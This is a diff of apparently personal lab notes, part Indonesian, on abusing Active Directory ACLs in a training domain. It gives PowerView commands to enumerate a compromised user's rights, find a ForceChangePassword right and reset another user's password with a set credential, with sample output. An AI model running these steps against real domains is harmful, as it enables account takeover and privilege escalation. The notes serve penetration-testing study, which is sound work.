@@ -25,28 +25,15 @@ Some example Active Directory object security permissions are as follows. These 
 - Addself:  abused with Add-DomainGroupMember
 ```
 
-## ACL Enumeration With Powerview
+### ACL Enumeration With Powerview
+In this section we use scenarion that:
+1. we have compromise user with username wley
+2. User wley has Force Change Password Object to User damundsen
+3. Login as damundsen, Enumerate this user has Generic Write rights to Help Desk Level 1 Groups
+4. Adding ourself (damundsen) as member of HELP DESK IT LEVEL 1
+   
+### Enumerate ForceChangePassword Right
 
-**Assume we have username wley as compromised user**
-
-### ForceChangePassword
-#### using Get-DomainObjectACL
-
-```python
-Import-Module .\PowerView.ps1
-$sid = Convert-NameToSid wley
-Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
-
-##Vulnerable Output
-ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
-ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529
-
-# ObjectAceType with above value meaning for Force-change-password
-#https://learn.microsoft.com/id-id/windows/win32/adschema/r-user-force-change-password
-```
-
-
-#### Using -ResolveGUIDs Flag
 ```python
 Import-Module .\PowerView.ps1
 $sid = Convert-NameToSid wley
@@ -58,40 +45,28 @@ ActiveDirectoryRights  : ExtendedRight
 ObjectAceType          : User-Force-Change-Password
 ```
 
-#### Enumerate All User
+*Enumerate All Users* 
 ```python
 Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
 foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
 
 ```
 
-### Abusing Force Change Password
+## Abusing Force Change Password
 **changing wley password without knowing his old password**
 
-1. Store Password user kita ke powershell credential
+First, Store Password user kita ke powershell credential
    
 ```python
    PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD Kita >' -AsPlainText -Force
    PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
 ```
 
-3. Kemudian create password dari user target (eg disini user damundsen yang bisa kita ganti)
+Then, Kemudian create password dari user target (eg disini user damundsen yang bisa kita ganti)
 ```python
 PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
 PS C:\htb> Import-Module .\PowerView.ps1
 PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
 ```
+ 
 
-#### Generic Write
-
-```python
-# Generic All Enumeration
-$sid2 = Convert-NameToSid damundsen
-Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
-
-AceType               : AccessAllowed
-ObjectDN              : CN=Help Desk Level 1,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
-ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
-*Now we can see that our user damundsen has GenericWrite privileges over the Help Desk Level 1 group. and with 
-
-```
